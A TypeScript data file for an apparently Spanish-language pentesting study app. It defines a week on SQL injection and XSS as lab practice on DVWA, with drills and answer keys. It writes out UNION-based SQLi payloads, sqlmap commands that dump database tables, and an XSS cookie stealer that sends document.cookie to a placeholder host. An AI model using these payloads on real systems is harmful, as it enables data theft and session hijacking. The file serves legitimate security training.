import { StudyWeek } from "@/lib/types";

/** MES 2 / SEMANA 5 (global 5) — Web: SQL Injection y XSS */
export const month2Week5: StudyWeek = {
  id: "m2-w5",
  monthId: "m2",
  title: "Semana 5 — SQL Injection y XSS",
  goal: "Detectar y explotar SQLi manual y con sqlmap; distinguir los 3 tipos de XSS.",
  detailed: true,
  blocks: [
    {
      id: "m2-w5-b1",
      weekId: "m2-w5",
      order: 1,
      title: "SQL Injection manual (detección + UNION-based)",
      objective: "Detectar un punto de inyección SQL y extraer datos con una UNION-based injection manual.",
      durationMin: 50,
      type: "practice",
      theoryEs:
        "SQLi ocurre cuando la app mete input del usuario directo en una query SQL sin sanitizar. Detección rápida: agregar ' o \" y ver si rompe la página (error SQL). UNION-based: una vez sabes el número de columnas, usas UNION SELECT para inyectar tus propios datos en la respuesta.",
      practiceSteps: [
        "Prueba de detección en DVWA (SQL Injection): http://127.0.0.1:4280 — security low. Agrega ' al parámetro id.",
        "Encuentra el número de columnas: ?id=1' ORDER BY 1-- - (incrementa hasta error)",
        "Confirma columnas visibles: ?id=-1' UNION SELECT 1,2,3-- -",
        "Extrae versión de la BD: ?id=-1' UNION SELECT 1,@@version,3-- -",
        "Extrae nombres de tablas (MySQL): ?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -",
      ],
      subtopics: ["web-sqli"],
      drills: [
        { id: "d1", promptEs: "Escribe el payload para probar detección básica de SQLi en el parámetro id.", answer: "1' OR '1'='1" },
        { id: "d2", promptEs: "Escribe el payload UNION-based para extraer la versión de la base de datos, asumiendo 3 columnas y que la columna 2 es visible.", answer: "-1' UNION SELECT 1,@@version,3-- -" },
      ],
      glossary: [
        { en: "SQL Injection", es: "inyección SQL" },
        { en: "UNION-based injection", es: "inyección basada en UNION" },
        { en: "information_schema", es: "esquema de información (metadatos de la BD)" },
      ],
      resources: [
        { label: "DVWA local — SQL Injection (security low)", url: "http://127.0.0.1:4280", platform: "Local" },
        { label: "PortSwigger Web Security Academy — SQL Injection", url: "https://portswigger.net/web-security/sql-injection", platform: "Docs" },
        { label: "TryHackMe — SQL Injection (opcional)", url: "https://tryhackme.com/room/sqlinjectionlm", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Detecté un punto de inyección con ' manualmente",
        "Extraje datos reales con UNION SELECT en el lab",
      ],
    },
    {
      id: "m2-w5-b2",
      weekId: "m2-w5",
      order: 2,
      title: "sqlmap: automatización de SQLi",
      objective: "Usar sqlmap para confirmar y explotar automáticamente una inyección SQL, extrayendo bases de datos y tablas.",
      durationMin: 45,
      type: "practice",
      theoryEs:
        "sqlmap automatiza todo lo del bloque anterior. Es más rápido pero en el examen debes saber interpretar y a veces ajustar sus flags (--dbs, --tables, --dump, cookies con --cookie, nivel de agresividad con --level/--risk).",
      practiceSteps: [
        "Prueba básica de una URL: sqlmap -u \"http://<IP>/page.php?id=1\"",
        "Lista bases de datos: sqlmap -u \"http://<IP>/page.php?id=1\" --dbs",
        "Lista tablas de una BD: sqlmap -u \"http://<IP>/page.php?id=1\" -D <db> --tables",
        "Vuelca (dump) una tabla completa: sqlmap -u \"http://<IP>/page.php?id=1\" -D <db> -T <tabla> --dump",
        "Si necesita sesión autenticada: agrega --cookie=\"PHPSESSID=...\"",
      ],
      subtopics: ["web-sqli"],
      drills: [
        { id: "d1", promptEs: "Escribe el comando sqlmap para listar las bases de datos de http://10.10.10.150/item.php?id=1", answer: "sqlmap -u \"http://10.10.10.150/item.php?id=1\" --dbs" },
        { id: "d2", promptEs: "Escribe el comando sqlmap para volcar (dump) la tabla 'users' de la base 'shop' en la misma URL.", answer: "sqlmap -u \"http://10.10.10.150/item.php?id=1\" -D shop -T users --dump" },
      ],
      glossary: [
        { en: "dump", es: "volcado de datos" },
        { en: "risk/level (sqlmap)", es: "nivel de riesgo/agresividad de las pruebas" },
      ],
      resources: [
        { label: "TryHackMe — SQLMap", url: "https://tryhackme.com/room/sqlibasic", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Ejecuté sqlmap contra un target vulnerable y extraje al menos 1 tabla",
        "Sé agregar --cookie cuando la inyección requiere sesión autenticada",
      ],
    },
    {
      id: "m2-w5-b3",
      weekId: "m2-w5",
      order: 3,
      title: "XSS: Reflected, Stored, DOM-based",
      objective: "Identificar y explotar los 3 tipos de XSS con un payload de prueba (alert/cookie stealer).",
      durationMin: 45,
      type: "practice",
      theoryEs: "XSS inyecta JavaScript que se ejecuta en el navegador de OTRO usuario. Reflected: el payload va en la URL/petición y se refleja inmediato (no persiste). Stored: el payload se guarda en la BD y afecta a cualquiera que vea esa página (más peligroso). DOM-based: el JS del propio sitio inserta el input del usuario en el DOM sin pasar por el servidor.",
      comparisonTable: {
        caption: "Tipos de XSS",
        headers: ["Tipo", "¿Dónde vive el payload?", "¿Persiste?", "Ejemplo típico"],
        rows: [
          ["Reflected", "En la URL/request, se refleja en la respuesta inmediata", "No", "Buscador que muestra 'resultados para: <payload>'"],
          ["Stored", "Guardado en la base de datos del servidor", "Sí, afecta a todos los que vean esa página", "Comentario malicioso en un blog"],
          ["DOM-based", "Procesado por JavaScript del cliente, nunca toca el servidor", "Depende de la lógica JS", "Un parámetro insertado con innerHTML sin sanitizar"],
        ],
      },
      practiceSteps: [
        "Prueba de detección básica: <script>alert(1)</script> en cualquier campo de input",
        "Confirma si es reflected probando el mismo payload por URL/GET",
        "Confirma si es stored guardando el payload (ej. comentario) y recargando desde OTRA sesión",
        "Payload de robo de cookie (para lab controlado): <script>fetch('http://<TU_IP>:8000/?c='+document.cookie)</script>",
      ],
      subtopics: ["web-xss"],
      drills: [
        { id: "d1", promptEs: "Escribe el payload XSS más básico para confirmar ejecución de JavaScript.", answer: "<script>alert(1)</script>" },
        { id: "d2", promptEs: "Un comentario con un payload malicioso queda guardado en la base de datos y afecta a todos los que visitan el post. ¿Qué tipo de XSS es?", answer: "stored" },
      ],
      glossary: [
        { en: "Cross-Site Scripting (XSS)", es: "secuencia de comandos en sitios cruzados" },
        { en: "cookie stealing", es: "robo de cookies" },
        { en: "DOM (Document Object Model)", es: "modelo de objetos del documento" },
      ],
      resources: [
        { label: "TryHackMe — Cross-site Scripting", url: "https://tryhackme.com/room/xss", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Ejecuté un XSS reflected y un XSS stored en labs distintos",
        "Explico la diferencia entre los 3 tipos sin ver la tabla",
      ],
    },
    {
      id: "m2-w5-b4",
      weekId: "m2-w5",
      order: 4,
      title: "Skill-check Semana 5",
      objective: "Aprobar el skill-check de SQLi/XSS (70%+) antes de avanzar a LFI/RFI.",
      durationMin: 45,
      type: "checkpoint",
      subtopics: ["web-sqli", "web-xss"],
      practiceSteps: [
        "Toma el skill-check en la app (Simulacros > Skill-checks > Semana 5)",
        "Completa DVWA (Damn Vulnerable Web App) en tu Kali local: módulos SQLi y XSS en nivel 'low' y 'medium'",
      ],
      resources: [
        { label: "DVWA (instalar local en Kali o vía Docker)", url: "https://github.com/digininja/DVWA", platform: "Kali" },
        { label: "TryHackMe — OWASP Top 10", url: "https://tryhackme.com/room/owasptop10", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Aprobé el skill-check de Semana 5 con 70% o más",
        "Completé SQLi y XSS en DVWA nivel low y medium",
      ],
    },
  ],
};
